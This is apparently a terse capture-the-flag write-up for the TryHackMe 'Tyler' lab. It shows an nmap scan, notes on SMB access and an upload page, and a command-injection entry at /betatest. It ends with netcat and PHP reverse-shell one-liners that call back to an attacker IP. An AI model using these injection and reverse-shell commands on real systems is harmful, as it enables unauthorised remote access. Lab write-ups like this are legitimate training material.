# TryHackMe-Tyler


## NMAP

```
Nmap scan report for 10.10.35.103
Host is up (0.18s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 46:6c:5a:31:5f:c1:1f:f3:65:e7:64:f2:c5:f5:59:d8 (RSA)
|   256 5d:a5:8a:af:1e:21:48:7a:04:22:3e:4a:f5:e4:5b:02 (ECDSA)
|_  256 6a:44:1c:e1:15:c9:5e:94:da:06:8d:db:d2:bc:66:54 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
5000/tcp open  http        Werkzeug httpd 1.0.0 (Python 3.6.8)
|_http-title: Tyler's file upload
8080/tcp open  http        nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
| http-title: LibreNMS
|_Requested resource was http://10.10.35.103:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|     Last-Modified: Thu, 26 Mar 2020 11:36:37 GMT
|     Date: Tue, 29 Sep 2020 14:17:45 GMT
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=9/29%Time=5F734209%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,B9,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nConte
SF:nt-Length:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nLas
SF:t-Modified:\x20Thu,\x2026\x20Mar\x202020\x2011:36:37\x20GMT\r\nDate:\x2
SF:0Tue,\x2029\x20Sep\x202020\x2014:17:45\x20GMT\r\n\r\n\n")%r(HTTPOptions
SF:,B9,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nContent-Lengt
SF:h:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nLast-Modifi
SF:ed:\x20Thu,\x2026\x20Mar\x202020\x2011:36:37\x20GMT\r\nDate:\x20Tue,\x2
SF:029\x20Sep\x202020\x2014:17:45\x20GMT\r\n\r\n\n")%r(FourOhFourRequest,B
SF:9,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nContent-Length:
SF:\x201\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nLast-Modified
SF::\x20Thu,\x2026\x20Mar\x202020\x2011:36:37\x20GMT\r\nDate:\x20Tue,\x202
SF:9\x20Sep\x202020\x2014:17:45\x20GMT\r\n\r\n\n")%r(GenericLines,67,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-
SF:8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionRe
SF:q,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request");
Service Info: Host: TYLER

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: TYLER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.1)
|   Computer name: tyler
|   NetBIOS computer name: TYLER\x00
|   Domain name: \x00
|   FQDN: tyler
|_  System time: 2020-09-29T10:19:13-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-29T14:19:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.28 seconds


```


## PORT 5000

Can upload


## PORT 8080

Can login


## SMB

```
smbclient -L \\\\<machine_ip>\\
smbclient \\\\<machine_ip>\\public
```

## PORT 80 

Navigate to `/betatest` where you find RCE

`root;reverse_shell`

#### Reverse shell

##### Netcat
```
nc -e /bin/sh 10.8.94.60 8888
```
##### PHP
```
php -r '$sock=fsockopen("10.8.94.60",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
```